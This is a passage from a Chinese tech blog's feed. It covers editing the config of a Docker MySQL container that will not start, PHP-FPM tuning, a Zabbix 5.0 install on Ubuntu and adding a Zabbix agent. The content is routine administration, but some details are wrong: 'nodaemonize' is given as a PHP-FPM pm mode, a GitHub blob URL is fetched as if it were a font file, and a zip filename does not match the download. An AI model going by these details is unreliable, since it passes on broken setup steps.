        <content type="html"><![CDATA[<p>在容器无法正常启动的情况下，如何修改其配置文件？</p><a id="more"></a><p>问题描述：因为错误的配置文件导致容器运行异常，无法正常启动，通常情况下只有进入容器才能修改配置文件，所以在不能进入容器的情况下该怎么办呢？</p><p>这种情况下，有两种方式去修改：<br>2. Docker 容器的配置文件一般在 <code>/var/lib/docker/overlay/</code>目录下，可以找到该目录下对应的配置文件进行修改。<br>2. 把容器中的配置文件复制到主机中，修改完之后，再移动到容器中。</p><h2 id="方式一"><a href="#方式一" class="headerlink" title="方式一"></a>方式一</h2><ol><li><p>查询日志</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker logs &lt;容器名称&#x2F;容器id&gt;</span><br><span class="line"></span><br><span class="line">ERROR: mysqld failed while attempting to check config</span><br><span class="line">command was: &quot;mysqld --verbose --help&quot;</span><br><span class="line">2020-09-03T12:15:54.644699Z 0 [ERROR] unknown variable &#39;realy-log&#x3D;slave-relay-bin&#39;</span><br><span class="line">2020-09-03T12:15:54.650119Z 0 [ERROR] Aborting</span><br></pre></td></tr></table></figure><p>由于异常日志可以得知是因为我将<code>relay-log</code> 写成了 <code>realy</code> 导致容器无法正常启动。</p></li><li><p>查找文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ find &#x2F; -name mysqld.cnf</span><br><span class="line"></span><br><span class="line">&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;02e1644bc1a4dc1adc9a0300e1815f364416570d69b715fb3b7de0a06cf0c495&#x2F;diff&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf</span><br><span class="line">&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;02e1644bc1a4dc1adc9a0300e1815f364416570d69b715fb3b7de0a06cf0c495&#x2F;merged&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf</span><br><span class="line">&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;4f128d7fb1200f722b0d2cfe3606149fe72987a7a16bc78551a2b1fe6c6c6572&#x2F;diff&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf</span><br><span class="line">&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;a68f1af4adf982b037f1bd37d61082fde1fa2b0e26ea0e2fe146edcb69b198ea&#x2F;diff&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf</span><br></pre></td></tr></table></figure><p>这里可能会出现多个配置文件，这是因为每一次重启Mysql 容器都会保留一个配置文件，所以理论上，直接修改第一个配置文件，就是当前Mysql 所使用的配置文件。</p></li><li><p>修改配置文件</p></li><li><p>重启容器即可。</p></li></ol><h2 id="方式二"><a href="#方式二" class="headerlink" title="方式二"></a>方式二</h2><p>如果第一种方式没生效，那可以尝试第二种方式。</p><ol><li><p>复制容器中的配置文件到主机：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 语法：docker cp &lt;容器名称&#x2F;容器id&gt;:&lt;配置文件在容器中的路径&gt; &lt;需要复制到主机的路径&gt;</span><br><span class="line"></span><br><span class="line">$ docker cp mysql:&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf ~&#x2F;mysqld.cnf</span><br></pre></td></tr></table></figure></li><li><p>修改主机中的配置文件</p></li><li><p>将该配置文件mv 到容器中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 语法：docker cp &lt;配置文件在主机中的路径&gt; &lt;容器名称&#x2F;容器id&gt;:&lt;配置文件在容器中的路径&gt;</span><br><span class="line"></span><br><span class="line">$ docker cp ~&#x2F;mysqld.cnf mysql:&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf</span><br></pre></td></tr></table></figure></li><li><p>重启配置文件即可。</p></li></ol><p>总结：两种方式均可以有效解决上述问题，当然这类方式仅适用于容器是因错误的配置文件导致无法正常启动的情况。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://blog.csdn.net/LinHenk/article/details/88111616" target="_blank" rel="noopener">Docker修改无法启动的容器的配置文件</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP-FPM 配置初始化</title>
      <link href="/php-fpm-configuration-initialization/"/>
      <url>/php-fpm-configuration-initialization/</url>
      
        <content type="html"><![CDATA[<p><code>php-fpm</code>（FastCGI Process Manger）是一个PHP FastCGI 管理器，专门和Nginx 的 <code>ngx_fastcgi_modul</code>模块对接，用来处理动态请求。</p><a id="more"></a><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><p>当安装了PHP 之后，可以从以下三个方向来对默认配置进行修改，以达到优化的效果。</p><h3 id="1-核心配置文件"><a href="#1-核心配置文件" class="headerlink" title="1. 核心配置文件"></a>1. 核心配置文件</h3><p>核心配置文件其实就是 <code>php.ini</code>，该配置文件的作用通常是用来启用或禁用第三方模块，及修改PHP 时区等。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># vim &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php&#x2F;php.ini</span><br><span class="line"></span><br><span class="line">date.timezone &#x3D; Asia&#x2F;Shanghai</span><br></pre></td></tr></table></figure><h3 id="2-全局配置文件"><a href="#2-全局配置文件" class="headerlink" title="2. 全局配置文件"></a>2. 全局配置文件</h3><p>全局配置文件<code>php-fpm.conf</code>，通常用来配置一些辅助性功能。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># vim &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php-fpm.conf</span><br><span class="line"></span><br><span class="line">error_log &#x3D; &#x2F;var&#x2F;log&#x2F;php-fpm&#x2F;error.log</span><br><span class="line">log_level &#x3D; notice</span><br><span class="line">;process_max &#x3D; 0</span><br><span class="line">deamonize &#x3D; yes</span><br></pre></td></tr></table></figure><p>参数解析：</p><ul><li><code>error_log</code>：错误日志路径</li><li><code>log_level</code>：日志级别，默认为notice<ul><li><code>alert</code>：必须立即处理</li><li><code>error</code>：错误情况</li><li><code>warning</code>：警告情况</li><li><code>notice</code>：一般重要信息</li><li><code>debug</code>：调试信息</li></ul></li><li><code>process_max</code>：控制最大子进程数的全局变量，不建议设置具体数量，因为会限制扩展配置。</li><li><code>daemonize</code>：是否开启守护进程，默认为yes</li></ul><p>通常不会在<code>php-fpm.conf</code>中设定 <code>process_max</code>，因为会限制<code>www.conf</code>中的配置。</p><h3 id="3-扩展配置文件"><a href="#3-扩展配置文件" class="headerlink" title="3. 扩展配置文件"></a>3. 扩展配置文件</h3><p>扩展配置文件<code>www.conf</code>通常是与<code>php-fpm</code>服务相关的配置，大部分优化都是需要更改这个配置文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># vim &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php-fpm.d&#x2F;www.conf</span><br><span class="line"></span><br><span class="line">listen &#x3D; 127.0.0.1:9000</span><br><span class="line">slowlog &#x3D; &#x2F;var&#x2F;log&#x2F;php-fpm&#x2F;www-slow.log</span><br><span class="line"></span><br><span class="line"># 这里按照10G 的空闲内存去设定</span><br><span class="line">pm &#x3D; dynamic</span><br><span class="line">pm.start_servers &#x3D; 16</span><br><span class="line">pm.max_children &#x3D; 256</span><br><span class="line">pm.min_spare_servers &#x3D; 16</span><br><span class="line">pm.max_spare_servers &#x3D; 32</span><br><span class="line">pm.max_requests &#x3D; 1000</span><br></pre></td></tr></table></figure><p>参数解析：</p><ul><li><code>listen</code>：有两种方式可以进行通讯。<ul><li><code>socket</code>：<code>unix:/run/php/php7.3-fpm.sock</code></li><li><code>http</code>：<code>127.0.0.1:9000</code> 因为<code>php-fpm</code>与<code>ngx_fastcgi_modul</code>的通讯方式是 9000端口，所以默认是 <code>127.0.0.1:9000</code></li></ul></li><li><code>slowlog</code>：慢查询日志路径</li><li><code>pm</code>：进程管理方式<ul><li><code>static</code>：静态模式。始终保持固定数量的子进程数，配合最大子进程数一起使用，这个方式很不灵活，通常不是默认。<ul><li><code>pm.max_children</code>：最大子进程数。</li></ul></li><li><code>dynamic</code>：动态模式。按照固定的最小子进程数启动，同时用最大子进程数去限制。<ul><li><code>pm.start_servers</code>：默认开启的进程数</li><li><code>pm.min_spare_servers</code>：最小空闲的进程数</li><li><code>pm.max_spare_servers</code>：最大空闲的进程数</li><li><code>pm.max_children</code>：最大子进程数</li><li><code>pm.max_requests</code>：每个进程能响应的请求数量，达到此限制之后，该PHP 进程就会被自动释放掉。</li></ul></li><li><code>nodaemonize</code>：每个进程在闲置一定时候后就会被杀掉。<ul><li><code>pm.max_children</code>：最大子进程数</li><li><code>pm.process_idle_timeout</code>：在多少秒之后，一个空闲的进程将会被杀死</li></ul></li></ul></li></ul><p>注意：<code>max_children</code> 是 PHPFPM Pool 最大的子进程数，它的数值取决于服务器实际空闲内存。假设你有一台10G 运行内存的服务器，我们知道一个空闲的PHP 进程占用的是 1M 内存，而一个正在处理请求的PHP 进程 大概会占用<code>10M-40M</code>内存，这里按照每个PHP 请求占用 40M 内存，那么<code>max_children = 10*1024M/40M = 256</code>，所以这个值得根据实际环境而设定。</p><p>以上就是<code>php-fpm</code> 初始化配置的核心部分了。</p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> PHP-FPM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Zabbix 快速上手——部署</title>
      <link href="/zabbix-quick-start/"/>
      <url>/zabbix-quick-start/</url>
      
        <content type="html"><![CDATA[<p>因为一些特殊原因，部分环境不是搭建在云上面，而是在托管的实体机上面，这就导致原本很多云可以帮我们做的事情，现在只能自己去做了。<br>比如：监控系统。</p><p>本着<strong>不想当运维的前端不是一个好全栈</strong>的思想，我迫切需要自己搭建一套完整的监控系统来解放自己的双手👐️。</p><a id="more"></a><p>我希望这套监控系统是怎样的？</p><ol><li>免费开源</li><li>入门相对容易</li><li>支持多平台分布式监控</li></ol><p>综合以上需求，最后我选择了 <a href="https://www.zabbix.com/" target="_blank" rel="noopener">Zabbix</a> 。</p><p>网上找了一圈，并没有发现合适的入门教程，要么是教程太老了，要么是写的不够详细，学习曲线很陡，光是部署就很费劲，而Zabbix 重要的不是部署，而是学会如何使用。</p><p>所以这篇笔记就是用来记录如何快速部署 Zabbix。</p><h2 id="认识-Zabbix"><a href="#认识-Zabbix" class="headerlink" title="认识 Zabbix"></a>认识 Zabbix</h2><p><a href="https://www.zabbix.com/" target="_blank" rel="noopener">Zabbix</a> 是一个企业级的分布式开源监控方案。</p><p>一个完整的监控系统是由服务机（zabbix server）和客户机（zabbix zgent）组成，运行大概流程是这样的：<br> <code>zabbix agent</code> 需要安装到被监控的主机上，它负责定期收集各项数据，并发送到 <code>zabbix server</code> 端，zabbix server将数据存储到自己的数据库中，<code>zabbix web</code>根据数据在前端进行展现和绘图。这里 agent 收集数据分为主动和被动两种模式：</p><ul><li>主动：agent 请求server 获取主动的监控项列表，并主动将监控项内需要检测的数据提交给 server/proxy 。</li><li>被动：server 向agent请求获取监控项的数据，agent返回数据。</li></ul><p>工作原理：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200905083643.png" alt=""></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>系统环境：</p><ul><li>Ubuntu 18.04 LTS</li><li>Mysql 5.7</li><li>PHP 7.2</li><li>Nginx </li><li>Zabbix 5.0</li></ul><h3 id="1-安装数据库"><a href="#1-安装数据库" class="headerlink" title="1. 安装数据库"></a>1. 安装数据库</h3><p>在正式安装之前，这里推荐先去<a href="https://www.zabbix.com/cn/download" target="_blank" rel="noopener">官网</a>找到符合自己的 Zabbix 服务器平台。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200902093733.png" alt=""></p><p>根据自己的实际环境来找到属于自己的下载链接，比如我是<code>Zabbix 5.0 + Ubuntu 18.04 + Mysql + Nginx</code>，所以我的安装方式应该是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ wget https:&#x2F;&#x2F;repo.zabbix.com&#x2F;zabbix&#x2F;5.0&#x2F;ubuntu&#x2F;pool&#x2F;main&#x2F;z&#x2F;zabbix-release&#x2F;zabbix-release_5.0-1+bionic_all.deb</span><br><span class="line">$ dpkg -i zabbix-release_5.0-1+bionic_all.deb</span><br><span class="line">$ apt update</span><br></pre></td></tr></table></figure><h3 id="2-安装Zabbix-server，Web前端，agent"><a href="#2-安装Zabbix-server，Web前端，agent" class="headerlink" title="2. 安装Zabbix server，Web前端，agent"></a>2. 安装Zabbix server，Web前端，agent</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ apt install zabbix-server-mysql zabbix-frontend-php zabbix-nginx-conf zabbix-agent</span><br></pre></td></tr></table></figure><ul><li>Zabbix Server：用来接收并处理 Zabbix agent 传过来的数据</li><li>Web 前端：Zabbix 的交互界面</li><li>Zabbix agent：需要被监控的主机</li></ul><h3 id="3-初始数据库"><a href="#3-初始数据库" class="headerlink" title="3. 初始数据库"></a>3. 初始数据库</h3><p>安装完数据库之后，并不能直接登录，因为不知道root 用户的密码，所以需要重置root 用户的密码，重置的方式有多种，这里推荐我常使用的的一种。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># vim &#x2F;etc&#x2F;mysql&#x2F;conf.d&#x2F;mysql.conf  </span><br><span class="line"># 也许你编辑的配置文件和我的名称不一样，不过没关系。</span><br><span class="line"></span><br><span class="line"># 添加下面两行配置</span><br><span class="line">[mysqld]</span><br><span class="line">skip-grant-tables</span><br></pre></td></tr></table></figure><p>重启Mysql 服务：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ service mysql restart</span><br></pre></td></tr></table></figure><p>现在的root 用户已经没有密码了，所以下一步要做的就是修改root 用户密码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ mysql -hlocalhost -uroot -p</span><br><span class="line"></span><br><span class="line">mysql &gt; UPDATE mysql.user SET authentication_string&#x3D;PASSWORD(&#39;password&#39;), plugin&#x3D;&#39;mysql_native_password&#39; WHERE User&#x3D;&#39;root&#39; AND Host&#x3D;&#39;localhost&#39;;</span><br></pre></td></tr></table></figure><p>然后再次修改刚才的配置文件，将下面那行配置给注释掉， 最后重启Mysql 服务就可以了。</p><p>Mysql 默认用户是root，这里不推荐直接使用 root 用户去管理 zabbix 数据库，所以还是使用官方推荐的方式，创建一个新的用户去管理：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ mysql -hlocalhost -uroot -p</span><br><span class="line"></span><br><span class="line">mysql&gt; create database zabbix character set utf8 collate utf8_bin;</span><br><span class="line">mysql&gt; create user zabbix@localhost identified by &#39;password&#39;;</span><br><span class="line">mysql&gt; grant all privileges on zabbix.* to zabbix@localhost;</span><br><span class="line">mysql&gt; flush privileges;</span><br><span class="line">mysql&gt; quit;</span><br></pre></td></tr></table></figure><p>这里默认Mysql 是运行在本地机器上，如果Mysql 运行在容器中，而Zabbix 又运行在本机上，可能会出现一些异常（我遇到了但没能解决）。</p><p>导入初始架构和数据。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ zcat &#x2F;usr&#x2F;share&#x2F;doc&#x2F;zabbix-server-mysql*&#x2F;create.sql.gz | mysql -uzabbix -p zabbix</span><br></pre></td></tr></table></figure><h3 id="4-配置数据库"><a href="#4-配置数据库" class="headerlink" title="4. 配置数据库"></a>4. 配置数据库</h3><p>为Zabbix server配置数据库，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># vim &#x2F;etc&#x2F;zabbix&#x2F;zabbix_server.conf</span><br><span class="line"></span><br><span class="line">DBPassword&#x3D;password</span><br></pre></td></tr></table></figure><h3 id="5-配置Web"><a href="#5-配置Web" class="headerlink" title="5. 配置Web"></a>5. 配置Web</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># vim &#x2F;etc&#x2F;zabbix&#x2F;nginx.conf</span><br><span class="line"></span><br><span class="line"># 去掉前面的注释，换成你自己的端口或者域名。</span><br><span class="line"># listen 80;</span><br><span class="line"># server_name example.com;</span><br></pre></td></tr></table></figure><h3 id="6-配置时区"><a href="#6-配置时区" class="headerlink" title="6. 配置时区"></a>6. 配置时区</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># vim &#x2F;etc&#x2F;zabbix&#x2F;php-fpm.conf</span><br><span class="line"></span><br><span class="line">php_value[date.timezone] &#x3D; Asia&#x2F;Shanghai</span><br></pre></td></tr></table></figure><h3 id="7-启动服务"><a href="#7-启动服务" class="headerlink" title="7. 启动服务"></a>7. 启动服务</h3><p>启动Zabbix server和agent 进程，并为它们设置开机自启：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ systemctl restart zabbix-server zabbix-agent nginx php7.2-fpm</span><br><span class="line">$ systemctl enable zabbix-server zabbix-agent nginx php7.2-fpm</span><br></pre></td></tr></table></figure><p>一切准备就绪之后，就可以访问了：<code>http://server_ip_or_name</code>，如果你上面配置的不是80 端口，那得记得加上对应的端口。如果你不能正常访问，那可能是因为防火墙没有允许该端口。</p><p>初次进来，需要配置相关参数，确认无误之后，点击 Next step。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200902105706.png" alt=""></p><p>Zabbix 默认的用户名和密码是<code>Admin</code>、<code>zabbix</code>，顺利登录到后台之后，记得修改默认登录密码。</p><h2 id="配置中文语言包"><a href="#配置中文语言包" class="headerlink" title="配置中文语言包"></a>配置中文语言包</h2><p>如果需要设置中文版的环境，需要做一些额外的配置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ vim &#x2F;usr&#x2F;share&#x2F;zabbix&#x2F;include&#x2F;locales.inc.php</span><br></pre></td></tr></table></figure><p>将zh_CN 后面参数改为 true。</p><p>如果在选择语言时，发现还是不能选择，并且提示：</p><blockquote><p>You are not able to choose some of the languages, because locales for them are not installed on the web server.</p></blockquote><p>这是因为你系统里没中文环境，查看当前的所有系统语言环境</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ locale -a</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200902110702.png" alt=""></p><h3 id="1-安装中文包"><a href="#1-安装中文包" class="headerlink" title="1. 安装中文包"></a>1. 安装中文包</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install language-pack-zh-hant language-pack-zh-hans</span><br></pre></td></tr></table></figure><h3 id="2-配置环境变量"><a href="#2-配置环境变量" class="headerlink" title="2. 配置环境变量"></a>2. 配置环境变量</h3><p>增加语言和编码的设置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># vim &#x2F;etc&#x2F;environment</span><br><span class="line"></span><br><span class="line">LANG&#x3D;&quot;zh_CN.UTF-8&quot;</span><br><span class="line">LANGUAGE&#x3D;&quot;zh_CN:zh:en_US:en&quot;</span><br></pre></td></tr></table></figure><h3 id="3-替换Zabbix-语言包"><a href="#3-替换Zabbix-语言包" class="headerlink" title="3. 替换Zabbix 语言包"></a>3. 替换Zabbix 语言包</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ cd cd &#x2F;usr&#x2F;share&#x2F;zabbix&#x2F;locale&#x2F;zh_CN&#x2F;LC_MESSAGES</span><br><span class="line">$ wget https:&#x2F;&#x2F;github.com&#x2F;echohn&#x2F;zabbix-zh_CN&#x2F;archive&#x2F;v0.1.0.zip</span><br><span class="line">$ unzip master.zip</span><br><span class="line">$ rm frontend.mo</span><br><span class="line">$ cp zabbix-zh_CN-master&#x2F;frontend.mo frontend.mo</span><br></pre></td></tr></table></figure><h3 id="4-解决乱码问题"><a href="#4-解决乱码问题" class="headerlink" title="4. 解决乱码问题"></a>4. 解决乱码问题</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ wget https:&#x2F;&#x2F;github.com&#x2F;chenqing&#x2F;ng-mini&#x2F;blob&#x2F;master&#x2F;font&#x2F;msyh.ttf</span><br><span class="line">$ vim &#x2F;usr&#x2F;share&#x2F;zabbix&#x2F;include&#x2F;defines.inc.php</span><br><span class="line"></span><br><span class="line"># 找到 define(&#39;ZBX_GRAPH_FONT_NAME&#39;, &#39;graphfont&#39;);</span><br><span class="line"># 将graphfont 替换成 msyh</span><br></pre></td></tr></table></figure><h3 id="5-更新mibs-库"><a href="#5-更新mibs-库" class="headerlink" title="5. 更新mibs 库"></a>5. 更新mibs 库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ apt-get install snmp-mibs-downloader</span><br></pre></td></tr></table></figure><h3 id="6-重启服务"><a href="#6-重启服务" class="headerlink" title="6. 重启服务"></a>6. 重启服务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ systemctl restart zabbix-server zabbix-agent php7.2-fpm</span><br></pre></td></tr></table></figure><p>至此Zabbix 的完整部署过程就全介绍完了。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.cnblogs.com/zangdalei/p/5712951.html" target="_blank" rel="noopener">Zabbix 3.0 for Ubuntu 14.04 LTS 安装</a></li><li><a href="https://www.zabbix.com/cn/download?zabbix=5.0&os_distribution=ubuntu&os_version=18.04_bionic&db=mysql&ws=nginx" target="_blank" rel="noopener">下载安装Zabbix——Zabbix 官网</a></li><li><a href="https://yq.aliyun.com/articles/611489" target="_blank" rel="noopener">企业级分布式监控系统–zabbix</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> Zabbix </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Zabbix </tag>
            
            <tag> 监控系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Zabbix 快速上手——添加Agent 主机</title>
      <link href="/zabbix-add-agent-host/"/>
      <url>/zabbix-add-agent-host/</url>
      
        <content type="html"><![CDATA[<p>Zabbix-Server 安装完成之后，下一步需要添加主机才能看到数据。</p><a id="more"></a><h2 id="安装Zabbix-Agent"><a href="#安装Zabbix-Agent" class="headerlink" title="安装Zabbix Agent"></a>安装Zabbix Agent</h2><p>Zabbix Agent 的作用是将服务器的数据发送给 Zabbix Server，所以只需要在需要监控的主机上安装 Zabbix Agent 就够了。</p><p>因为我的环境是：<code>Ubuntu 18.04</code>、<code>Nginx</code>、<code>Mysql</code>、<code>PHP</code>，根据<a href="https://www.zabbix.com/cn/download" target="_blank" rel="noopener">官网</a>的选择对应的下载链接。</p><p>在有了<code>Mysql</code> 和 <code>Nginx</code>的情况下，这里我只选择安装 <code>Zabbix Agent</code>，如果没有的话，那就需要额外安装<code>zabbix-mysql</code>、<code>zabbix-nginx-conf</code>、<code>zabbix-frontend-php</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ wget https:&#x2F;&#x2F;repo.zabbix.com&#x2F;zabbix&#x2F;5.0&#x2F;ubuntu&#x2F;pool&#x2F;main&#x2F;z&#x2F;zabbix-release&#x2F;zabbix-release_5.0-1+bionic_all.deb</span><br><span class="line">$ dpkg -i zabbix-release_5.0-1+bionic_all.deb</span><br><span class="line">$ apt update</span><br><span class="line">$ apt install zabbix-agent</span><br></pre></td></tr></table></figure><h2 id="配置-Zabbix-Agent"><a href="#配置-Zabbix-Agent" class="headerlink" title="配置 Zabbix Agent"></a>配置 Zabbix Agent</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># vim &#x2F;etc&#x2F;zabbix&#x2F;zabbix_agentd.conf</span><br><span class="line"></span><br><span class="line">Server：Zabbix Server 的IP 地址</span><br><span class="line">ServerActive：Zabbix Server 的IP 地址</span><br><span class="line">Hostname：Zabbix Agent 这台主机的别名</span><br></pre></td></tr></table></figure><p>核心的配置只有这三行，改完之后，重启以下 Zabbix Agent。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ systemctl restart zabbix-agent</span><br></pre></td></tr></table></figure><h2 id="添加主机"><a href="#添加主机" class="headerlink" title="添加主机"></a>添加主机</h2><p>完成以上配置之后，下一步需要做的就是打开 Zabbix 的Web 端，开始添加主机。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200904200443.png" alt=""></p><p>配置主机基础信息：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200904205302.png" alt=""></p><ul><li>主机名称：zabbix_agentd.conf 中的Hostname</li><li>客户端IP：需要监控的主机的IP 地址</li><li>端口默认使用 10050</li></ul><p>配置模版：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200904213331.png" alt=""></p><p>需要注意的是，如果没有配置模版，可能会导致没有数据。</p><p>然后点击添加即可。</p><p>打开监控面板，点击主机，正常情况下，主机状态应该是这样的。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200904214447.png" alt=""></p><p>至此就完成了Agent 的添加，点击最新数据或者图形可以看到相应的数据。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://blog.51cto.com/dyc2005/1971212" target="_blank" rel="noopener">安装zabbix-agent并添加到zabbix web中监控</a></li><li><a href="https://blog.csdn.net/kk185800961/article/details/84105621" target="_blank" rel="noopener">Zabbix 使用 Zabbix-Agent 添加新的Linux服务器监控</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> Zabbix </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Zabbix </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql 主从架构配置</title>
      <link href="/mysql-master-slave-architecture-configuration/"/>
      <url>/mysql-master-slave-architecture-configuration/</url>
      
